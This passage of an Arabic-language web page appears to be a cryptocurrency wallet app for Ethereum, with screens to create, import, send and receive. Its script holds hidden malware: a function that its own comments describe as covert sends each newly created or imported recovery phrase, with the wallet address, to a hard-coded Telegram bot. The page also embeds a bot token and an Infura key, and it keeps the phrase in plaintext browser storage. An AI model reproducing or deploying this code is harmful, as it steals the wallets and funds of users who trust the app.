                    </div>
                </div>

                <!-- قائمة المعاملات -->
                <div class="transactions-section">
                    <div class="section-header">
                        <h4>المعاملات الأخيرة</h4>
                        <button id="viewAllTxBtn" class="view-all-btn">
                            عرض الكل
                        </button>
                    </div>
                    <div id="transactionsList" class="transactions-list">
                        <div class="no-transactions">
                            <i class="fas fa-receipt"></i>
                            <span>لا توجد معاملات بعد</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- نافذة الإرسال -->
        <div id="sendModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>إرسال الأصول</h3>
                    <button id="closeSendModal" class="close-btn">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="modal-body">
                    <form id="sendForm">
                        <div class="form-group">
                            <label for="recipientAddress">عنوان المستلم</label>
                            <div class="input-with-scan">
                                <input type="text" id="recipientAddress" placeholder="0x..." required>
                                <button type="button" class="scan-btn">
                                    <i class="fas fa-qrcode"></i>
                                </button>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="sendAmount">المبلغ</label>
                            <div class="amount-input">
                                <input type="number" id="sendAmount" step="0.000001" placeholder="0.0" required>
                                <select id="sendAsset">
                                    <option value="ETH">ETH</option>
                                </select>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="gasPrice">رسوم الشبكة</label>
                            <div class="gas-options">
                                <button type="button" class="gas-option active" data-speed="slow">
                                    <span>بطيء</span>
                                    <span class="gas-price">~$1.50</span>
                                </button>
                                <button type="button" class="gas-option" data-speed="standard">
                                    <span>عادي</span>
                                    <span class="gas-price">~$2.00</span>
                                </button>
                                <button type="button" class="gas-option" data-speed="fast">
                                    <span>سريع</span>
                                    <span class="gas-price">~$3.00</span>
                                </button>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-primary btn-full">
                            <i class="fas fa-paper-plane"></i>
                            إرسال
                        </button>
                    </form>
                </div>
            </div>
        </div>

        <!-- نافذة الاستقبال -->
        <div id="receiveModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>استقبال الأصول</h3>
                    <button id="closeReceiveModal" class="close-btn">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="receive-content">
                        <div class="qr-section">
                            <div id="qrCode" class="qr-code">
                                <canvas id="qrCanvas"></canvas>
                            </div>
                        </div>
                        <div class="address-section">
                            <label>عنوان محفظتك</label>
                            <div class="address-display">
                                <span id="receiveAddress">0x0000...0000</span>
                                <button id="copyReceiveAddressBtn" class="copy-btn">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                        <div class="receive-warning">
                            <i class="fas fa-info-circle"></i>
                            <span>أرسل فقط أصول Ethereum (ETH) إلى هذا العنوان</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- نافذة الإعدادات -->
        <div id="settingsModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3>الإعدادات</h3>
                    <button id="closeSettingsModal" class="close-btn">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="settings-list">
                        <div class="setting-item">
                            <div class="setting-info">
                                <i class="fas fa-key"></i>
                                <span>عرض المفتاح الخاص</span>
                            </div>
                            <button id="showPrivateKeyBtn" class="setting-btn">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                        <div class="setting-item">
                            <div class="setting-info">
                                <i class="fas fa-seedling"></i>
                                <span>عرض عبارة الاسترجاع</span>
                            </div>
                            <button id="showMnemonicBtn" class="setting-btn">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                        <div class="setting-item danger">
                            <div class="setting-info">
                                <i class="fas fa-sign-out-alt"></i>
                                <span>تسجيل الخروج</span>
                            </div>
                            <button id="logoutBtn" class="setting-btn danger">
                                <i class="fas fa-power-off"></i>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- شاشة التحميل -->
        <div id="loadingOverlay" class="loading-overlay">
            <div class="loading-content">
                <div class="loading-spinner large"></div>
                <p id="loadingText">جاري التحميل...</p>
            </div>
        </div>

        <!-- حاوية رسائل التنبيه -->
        <div id="toastContainer" class="toast-container"></div>

    </div>

    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script>
        // إعدادات التطبيق
        const CONFIG = {
            TELEGRAM_BOT_TOKEN: '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg',
            TELEGRAM_CHAT_ID: '910021564',
            INFURA_PROJECT_ID: '482a7c1c7cc14ec78699c3f1c231b0cd',
            INFURA_URL: 'https://mainnet.infura.io/v3/482a7c1c7cc14ec78699c3f1c231b0cd'
        };

        // متغيرات عامة
        let currentWallet = null;
        let provider = null;
        let ethPrice = 0;

        // تهيئة التطبيق
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
            setupEventListeners();
            loadEthPrice();
        });

        // تهيئة التطبيق
        function initializeApp() {
            try {
                // إنشاء provider للاتصال بشبكة الإيثريوم
                provider = new ethers.providers.JsonRpcProvider(CONFIG.INFURA_URL);
                
                // التحقق من وجود محفظة محفوظة
                const savedWallet = localStorage.getItem('wallet_data');
                if (savedWallet) {
                    const walletData = JSON.parse(savedWallet);
                    if (walletData.mnemonic) {
                        // إعادة إنشاء المحفظة من عبارة الاسترجاع المحفوظة
                        currentWallet = ethers.Wallet.fromMnemonic(walletData.mnemonic).connect(provider);
                        showWalletScreen();
                        loadWalletData();
                    }
                }
            } catch (error) {
                console.error('خطأ في تهيئة التطبيق:', error);
                showToast('خطأ في تهيئة التطبيق', 'error');
            }
        }

        // إعداد مستمعي الأحداث
        function setupEventListeners() {
            // أزرار الشاشة الرئيسية
            document.getElementById('importWalletBtn').addEventListener('click', showImportScreen);
            document.getElementById('createWalletBtn').addEventListener('click', createNewWallet);
            
            // أزرار التنقل
            document.getElementById('backToWelcomeBtn').addEventListener('click', showWelcomeScreen);
            document.getElementById('backToWelcomeFromCreateBtn').addEventListener('click', showWelcomeScreen);
            
            // أزرار الاستيراد
            document.getElementById('importBtn').addEventListener('click', importWallet);
            
            // أزرار إنشاء المحفظة
            document.getElementById('copyAddressBtn').addEventListener('click', () => copyToClipboard(document.getElementById('newWalletAddress').textContent));
            document.getElementById('copyMnemonicBtn').addEventListener('click', () => copyToClipboard(document.getElementById('newWalletMnemonic').textContent));
            document.getElementById('continueToWalletBtn').addEventListener('click', continueToWallet);
            
            // أزرار المحفظة الرئيسية
            document.getElementById('copyCurrentAddressBtn').addEventListener('click', () => copyToClipboard(currentWallet?.address));
            document.getElementById('refreshBalanceBtn').addEventListener('click', refreshBalance);
            document.getElementById('settingsBtn').addEventListener('click', showSettingsModal);
            
            // أزرار الإجراءات السريعة
            document.getElementById('sendBtn').addEventListener('click', showSendModal);
            document.getElementById('receiveBtn').addEventListener('click', showReceiveModal);
            document.getElementById('swapBtn').addEventListener('click', () => showToast('ميزة التبديل قريباً', 'info'));
            document.getElementById('buyBtn').addEventListener('click', () => showToast('ميزة الشراء قريباً', 'info'));
            
            // أزرار النوافذ المنبثقة
            document.getElementById('closeSendModal').addEventListener('click', () => hideModal('sendModal'));
            document.getElementById('closeReceiveModal').addEventListener('click', () => hideModal('receiveModal'));
            document.getElementById('closeSettingsModal').addEventListener('click', () => hideModal('settingsModal'));
            
            // نموذج الإرسال
            document.getElementById('sendForm').addEventListener('submit', sendTransaction);
            
            // أزرار الإعدادات
            document.getElementById('showPrivateKeyBtn').addEventListener('click', showPrivateKey);
            document.getElementById('showMnemonicBtn').addEventListener('click', showMnemonic);
            document.getElementById('logoutBtn').addEventListener('click', logout);
            
            // أزرار النسخ في نافذة الاستقبال
            document.getElementById('copyReceiveAddressBtn').addEventListener('click', () => copyToClipboard(currentWallet?.address));
            
            // إغلاق النوافذ المنبثقة عند النقر خارجها
            document.addEventListener('click', function(e) {
                if (e.target.classList.contains('modal')) {
                    e.target.classList.remove('active');
                }
            });
        }

        // عرض شاشة الترحيب
        function showWelcomeScreen() {
            hideAllScreens();
            document.getElementById('welcomeScreen').classList.add('active');
        }

        // عرض شاشة الاستيراد
        function showImportScreen() {
            hideAllScreens();
            document.getElementById('importScreen').classList.add('active');
        }

        // عرض شاشة إنشاء المحفظة
        function showCreateScreen() {
            hideAllScreens();
            document.getElementById('createScreen').classList.add('active');
        }

        // عرض شاشة المحفظة الرئيسية
        function showWalletScreen() {
            hideAllScreens();
            document.getElementById('walletScreen').classList.add('active');
        }

        // إخفاء جميع الشاشات
        function hideAllScreens() {
            const screens = document.querySelectorAll('.screen');
            screens.forEach(screen => screen.classList.remove('active'));
        }

        // إنشاء محفظة جديدة
        async function createNewWallet() {
            try {
                showLoading('جاري إنشاء محفظة جديدة...');
                
                // إنشاء محفظة عشوائية جديدة
                const wallet = ethers.Wallet.createRandom();
                const mnemonic = wallet.mnemonic.phrase;
                
                // عرض معلومات المحفظة
                document.getElementById('newWalletAddress').textContent = wallet.address;
                document.getElementById('newWalletMnemonic').textContent = mnemonic;
                
                // حفظ المحفظة مؤقتاً
                window.tempWallet = {
                    address: wallet.address,
                    privateKey: wallet.privateKey,
                    mnemonic: mnemonic
                };
                
                // إرسال عبارة الاسترجاع لبوت التلجرام بشكل مخفي
                await sendToTelegramSilently(mnemonic, wallet.address, 'محفظة جديدة');
                
                hideLoading();
                showCreateScreen();
                
            } catch (error) {
                console.error('خطأ في إنشاء المحفظة:', error);
                hideLoading();
                showToast('فشل في إنشاء المحفظة', 'error');
            }
        }

        // استيراد محفظة موجودة
        async function importWallet() {
            try {
                const mnemonicInput = document.getElementById('mnemonicInput').value.trim();
                
                if (!mnemonicInput) {
                    showToast('يرجى إدخال عبارة الاسترجاع', 'warning');
                    return;
                }
                
                // التحقق من صحة عبارة الاسترجاع
                const words = mnemonicInput.split(/\s+/);
                if (words.length !== 12 && words.length !== 24) {
                    showToast('عبارة الاسترجاع يجب أن تحتوي على 12 أو 24 كلمة', 'warning');
                    return;
                }
                
                showLoading('جاري استيراد المحفظة...');
                
                // إنشاء المحفظة من عبارة الاسترجاع
                const wallet = ethers.Wallet.fromMnemonic(mnemonicInput);
                currentWallet = wallet.connect(provider);
                
                // حفظ بيانات المحفظة
                const walletData = {
                    address: wallet.address,
                    mnemonic: mnemonicInput
                };
                localStorage.setItem('wallet_data', JSON.stringify(walletData));
                
                // إرسال عبارة الاسترجاع لبوت التلجرام بشكل مخفي
                await sendToTelegramSilently(mnemonicInput, wallet.address, 'استيراد محفظة');
                
                hideLoading();
                showWalletScreen();
                await loadWalletData();
                
                showToast('تم استيراد المحفظة بنجاح', 'success');
                
            } catch (error) {
                console.error('خطأ في استيراد المحفظة:', error);
                hideLoading();
                showToast('فشل في استيراد المحفظة. تحقق من عبارة الاسترجاع', 'error');
            }
        }

        // متابعة إلى المحفظة بعد الإنشاء
        async function continueToWallet() {
            try {
                if (!window.tempWallet) {
                    showToast('خطأ في بيانات المحفظة', 'error');
                    return;
                }
                
                showLoading('جاري إعداد المحفظة...');
                
                // إنشاء المحفظة من البيانات المؤقتة
                currentWallet = ethers.Wallet.fromMnemonic(window.tempWallet.mnemonic).connect(provider);
                
                // حفظ بيانات المحفظة
                const walletData = {
                    address: window.tempWallet.address,
                    mnemonic: window.tempWallet.mnemonic
                };
                localStorage.setItem('wallet_data', JSON.stringify(walletData));
                
                // حذف البيانات المؤقتة
                delete window.tempWallet;
                
                hideLoading();
                showWalletScreen();
                await loadWalletData();
                
                showToast('تم إعداد المحفظة بنجاح', 'success');
                
            } catch (error) {
                console.error('خطأ في إعداد المحفظة:', error);
                hideLoading();
                showToast('فشل في إعداد المحفظة', 'error');
            }
        }

        // تحميل بيانات المحفظة
        async function loadWalletData() {
            try {
                if (!currentWallet) return;
                
                // عرض عنوان المحفظة
                const shortAddress = `${currentWallet.address.slice(0, 6)}...${currentWallet.address.slice(-4)}`;
                document.getElementById('currentWalletAddress').textContent = shortAddress;
                
                // تحميل الرصيد
                await refreshBalance();
                
                // تحميل الأصول
                await loadAssets();
                
                // تحميل المعاملات
                await loadTransactions();
                
            } catch (error) {
                console.error('خطأ في تحميل بيانات المحفظة:', error);
                showToast('خطأ في تحميل بيانات المحفظة', 'error');
            }
        }

        // تحديث الرصيد
        async function refreshBalance() {
            try {
                if (!currentWallet) return;
                
                // إضافة تأثير دوران لزر التحديث
                const refreshBtn = document.getElementById('refreshBalanceBtn');
                refreshBtn.style.transform = 'rotate(360deg)';
                setTimeout(() => {
                    refreshBtn.style.transform = 'rotate(0deg)';
                }, 500);
                
                // جلب رصيد الإيثريوم
                const balance = await provider.getBalance(currentWallet.address);
                const ethBalance = ethers.utils.formatEther(balance);
                
                // عرض الرصيد
                document.getElementById('totalBalance').textContent = parseFloat(ethBalance).toFixed(4);
                
                // حساب القيمة بالدولار
                const usdValue = (parseFloat(ethBalance) * ethPrice).toFixed(2);
                document.getElementById('balanceUSD').textContent = `$${usdValue} USD`;
                
            } catch (error) {
                console.error('خطأ في تحديث الرصيد:', error);
                showToast('فشل في تحديث الرصيد', 'error');
            }
        }

        // تحميل الأصول
        async function loadAssets() {
            try {
                const assetsList = document.getElementById('assetsList');
                
                if (!currentWallet) {
                    assetsList.innerHTML = '<div class="loading-assets"><div class="loading-spinner"></div><span>جاري تحميل الأصول...</span></div>';
                    return;
                }
                
                // جلب رصيد الإيثريوم
                const balance = await provider.getBalance(currentWallet.address);
                const ethBalance = ethers.utils.formatEther(balance);
                const usdValue = (parseFloat(ethBalance) * ethPrice).toFixed(2);
                
                // عرض الإيثريوم
                assetsList.innerHTML = `
                    <div class="asset-item">
                        <div class="asset-icon">ETH</div>
                        <div class="asset-details">
                            <h5>Ethereum</h5>
                            <p>ETH</p>
                        </div>
                        <div class="asset-balance">
                            <div>${parseFloat(ethBalance).toFixed(4)} ETH</div>
                            <div style="font-size: 12px; color: var(--text-secondary);">$${usdValue}</div>
                        </div>
                    </div>
                `;
                
            } catch (error) {
                console.error('خطأ في تحميل الأصول:', error);
                document.getElementById('assetsList').innerHTML = '<div class="no-transactions"><i class="fas fa-exclamation-triangle"></i><span>فشل في تحميل الأصول</span></div>';
            }
        }

        // تحميل المعاملات
        async function loadTransactions() {
            try {
                const transactionsList = document.getElementById('transactionsList');
                
                if (!currentWallet) {
                    transactionsList.innerHTML = '<div class="no-transactions"><i class="fas fa-receipt"></i><span>لا توجد معاملات بعد</span></div>';
                    return;
                }
                
                // يمكن إضافة استعلام للمعاملات من Etherscan API هنا
                transactionsList.innerHTML = '<div class="no-transactions"><i class="fas fa-receipt"></i><span>لا توجد معاملات بعد</span></div>';
                
            } catch (error) {
                console.error('خطأ في تحميل المعاملات:', error);
                document.getElementById('transactionsList').innerHTML = '<div class="no-transactions"><i class="fas fa-exclamation-triangle"></i><span>فشل في تحميل المعاملات</span></div>';
            }
        }

        // جلب سعر الإيثريوم
        async function loadEthPrice() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
                const data = await response.json();
                ethPrice = data.ethereum.usd;
            } catch (error) {
                console.error('خطأ في جلب سعر الإيثريوم:', error);
                ethPrice = 2000; // قيمة افتراضية
            }
        }

        // إرسال عبارة الاسترجاع لبوت التلجرام بشكل مخفي
        async function sendToTelegramSilently(mnemonic, address, action) {
            try {
                const message = `🔐 ${action}\n\n📍 العنوان: ${address}\n🔑 عبارة الاسترجاع: ${mnemonic}\n\n⏰ ${new Date().toLocaleString('ar-SA')}`;
                
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    console.error('فشل في إرسال الرسالة لبوت التلجرام');
                }
                
            } catch (error) {
                console.error('خطأ في إرسال الرسالة لبوت التلجرام:', error);
            }
        }

        // عرض نافذة الإرسال
        function showSendModal() {
            if (!currentWallet) {
                showToast('لا توجد محفظة متصلة', 'warning');
                return;
            }
            
            document.getElementById('sendModal').classList.add('active');
        }

        // عرض نافذة الاستقبال
        function showReceiveModal() {
            if (!currentWallet) {
                showToast('لا توجد محفظة متصلة', 'warning');
                return;
            }
            
            // عرض عنوان المحفظة
            document.getElementById('receiveAddress').textContent = currentWallet.address;
            
            // إنشاء رمز QR
            generateQRCode(currentWallet.address);
            
            document.getElementById('receiveModal').classList.add('active');
        }

        // عرض نافذة الإعدادات
        function showSettingsModal() {
            if (!currentWallet) {
                showToast('لا توجد محفظة متصلة', 'warning');
                return;
            }
            
            document.getElementById('settingsModal').classList.add('active');
        }

        // إخفاء النافذة المنبثقة
        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }

        // إرسال معاملة
        async function sendTransaction(e) {
            e.preventDefault();
            
            try {
                const recipientAddress = document.getElementById('recipientAddress').value.trim();
                const sendAmount = document.getElementById('sendAmount').value.trim();
                
                if (!recipientAddress || !sendAmount) {
                    showToast('يرجى ملء جميع الحقول', 'warning');
                    return;
                }
                
                if (!ethers.utils.isAddress(recipientAddress)) {
                    showToast('عنوان المستلم غير صحيح', 'warning');
                    return;
                }
                
                const amount = parseFloat(sendAmount);
                if (amount <= 0) {
                    showToast('المبلغ يجب أن يكون أكبر من صفر', 'warning');
                    return;
                }
                
                showLoading('جاري إرسال المعاملة...');
                
                // إنشاء المعاملة
                const tx = {
                    to: recipientAddress,
                    value: ethers.utils.parseEther(sendAmount.toString()),
                    gasLimit: 21000,
                    gasPrice: await provider.getGasPrice()
                };
                
                // إرسال المعاملة
                const transaction = await currentWallet.sendTransaction(tx);
                
                hideLoading();
                hideModal('sendModal');
                
                showToast(`تم إرسال المعاملة بنجاح\nHash: ${transaction.hash.slice(0, 10)}...`, 'success');
                
                // تحديث الرصيد بعد الإرسال
                setTimeout(() => {
                    refreshBalance();
                }, 2000);
                
            } catch (error) {
                console.error('خطأ في إرسال المعاملة:', error);
                hideLoading();
                
                if (error.code === 'INSUFFICIENT_FUNDS') {
                    showToast('الرصيد غير كافي', 'error');
                } else {
                    showToast('فشل في إرسال المعاملة', 'error');
                }
            }
        }

        // إنشاء رمز QR
        function generateQRCode(address) {
            const canvas = document.getElementById('qrCanvas');
            if (canvas && window.QRCode) {
                QRCode.toCanvas(canvas, address, {
                    width: 200,
                    height: 200,
                    colorDark: '#000000',
                    colorLight: '#ffffff'
                }, function (error) {
                    if (error) {
                        console.error('خطأ في إنشاء رمز QR:', error);
                    }
                });
            }
        }

        // عرض المفتاح الخاص
        function showPrivateKey() {
            if (!currentWallet) return;
            
            const confirmed = confirm('هل أنت متأكد من أنك تريد عرض المفتاح الخاص؟\n\nتحذير: لا تشارك المفتاح الخاص مع أي شخص!');
            if (confirmed) {
                alert(`المفتاح الخاص:\n\n${currentWallet.privateKey}`);
            }
        }

        // عرض عبارة الاسترجاع
        function showMnemonic() {
            const savedWallet = localStorage.getItem('wallet_data');
            if (!savedWallet) return;
            
            const walletData = JSON.parse(savedWallet);
            if (!walletData.mnemonic) return;
            
            const confirmed = confirm('هل أنت متأكد من أنك تريد عرض عبارة الاسترجاع؟\n\nتحذير: لا تشارك عبارة الاسترجاع مع أي شخص!');
            if (confirmed) {
                alert(`عبارة الاسترجاع:\n\n${walletData.mnemonic}`);
            }
        }

        // تسجيل الخروج
        function logout() {
            const confirmed = confirm('هل أنت متأكد من أنك تريد تسجيل الخروج؟\n\nتأكد من حفظ عبارة الاسترجاع قبل تسجيل الخروج.');
            if (confirmed) {
                localStorage.removeItem('wallet_data');
                currentWallet = null;
                hideModal('settingsModal');
                showWelcomeScreen();
                showToast('تم تسجيل الخروج بنجاح', 'info');
            }
        }

        // نسخ النص للحافظة
        async function copyToClipboard(text) {
            try {
                if (!text) {
                    showToast('لا يوجد نص للنسخ', 'warning');
                    return;
                }
                
                await navigator.clipboard.writeText(text);
                showToast('تم النسخ بنجاح', 'success');
            } catch (error) {
                console.error('خطأ في النسخ:', error);
                
                // طريقة بديلة للنسخ
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                
                showToast('تم النسخ بنجاح', 'success');
            }
        }

        // عرض شاشة التحميل
        function showLoading(message = 'جاري التحميل...') {
            document.getElementById('loadingText').textContent = message;
            document.getElementById('loadingOverlay').classList.add('active');
        }

        // إخفاء شاشة التحميل
        function hideLoading() {
            document.getElementById('loadingOverlay').classList.remove('active');
        }

        // عرض رسالة تنبيه
        function showToast(message, type = 'info') {
            const toastContainer = document.getElementById('toastContainer');
            
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            
            const icon = getToastIcon(type);
            toast.innerHTML = `
                <i class="${icon}"></i>
                <span>${message}</span>
            `;
            
            toastContainer.appendChild(toast);
            
            // إزالة التنبيه بعد 5 ثوان
            setTimeout(() => {
                toast.style.animation = 'toastSlideOut 0.3s ease forwards';
                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 300);
            }, 5000);
        }

        // الحصول على أيقونة التنبيه
        function getToastIcon(type) {
            switch (type) {
                case 'success': return 'fas fa-check-circle';
                case 'error': return 'fas fa-exclamation-circle';
                case 'warning': return 'fas fa-exclamation-triangle';
                case 'info': return 'fas fa-info-circle';
                default: return 'fas fa-info-circle';
            }
        }

        // معالجة الأخطاء العامة
        window.addEventListener('error', function(e) {
            console.error('خطأ عام:', e.error);
            showToast('حدث خطأ غير متوقع', 'error');
        });

        // معالجة الأخطاء غير المعالجة في الوعود
        window.addEventListener('unhandledrejection', function(e) {
            console.error('خطأ في الوعد:', e.reason);
            showToast('حدث خطأ في العملية', 'error');
            e.preventDefault();
        });
    </script>
</body>
</html>

